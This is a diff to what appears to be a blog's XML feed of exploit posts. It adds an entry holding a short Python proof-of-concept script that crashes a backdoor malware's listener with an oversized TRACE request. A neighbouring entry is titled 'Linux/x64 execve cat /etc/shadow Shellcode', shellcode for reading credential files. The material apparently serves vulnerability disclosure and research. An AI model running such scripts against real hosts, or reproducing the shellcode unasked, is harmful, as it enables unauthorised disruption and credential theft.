@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Backdoor.Win32.Aphexdoor.LiteSock Buffer Overflow</title>
+      <link href="2021/02/11/Backdoor-Win32-Aphexdoor-LiteSock-Buffer-Overflow/"/>
+      <url>2021/02/11/Backdoor-Win32-Aphexdoor-LiteSock-Buffer-Overflow/</url>
+      
+        <content type="html"><![CDATA[<hr><h4 id="Backdoor-Win32-Aphexdoor-LiteSock-Buffer-Overflow"><a href="#Backdoor-Win32-Aphexdoor-LiteSock-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.Aphexdoor.LiteSock Buffer Overflow"></a>Backdoor.Win32.Aphexdoor.LiteSock Buffer Overflow</h4><p>Backdoor.Win32.Aphexdoor.LiteSock malware suffers from a buffer overflow vulnerability.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">Exploit/PoC:<br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">1415</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PACKOLA=<span class="hljs-string">&quot;TRACE /&quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">72</span>+<span class="hljs-string">&quot; HTTP/1.1\r\nHost: &quot;</span>+MALWARE_HOST+<span class="hljs-string">&quot;\r\n\X-Request-ID: &quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">72</span> <br>  <br>    s.send(PACKOLA)<br>    s.close()<br>  <br>    print(<span class="hljs-string">&quot;Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer Overflow&quot;</span>)<br>    print(<span class="hljs-string">&quot;MD5: a8bb1744bedf43849ed808b7dfa32da4&quot;</span>)<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Buffer Overflow </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Linux/x64 execve cat /etc/shadow Shellcode</title>
       <link href="2021/02/11/Linux-x64-execve-cat-etc-shadow-Shellcode/"/>
       <url>2021/02/11/Linux-x64-execve-cat-etc-shadow-Shellcode/</url>
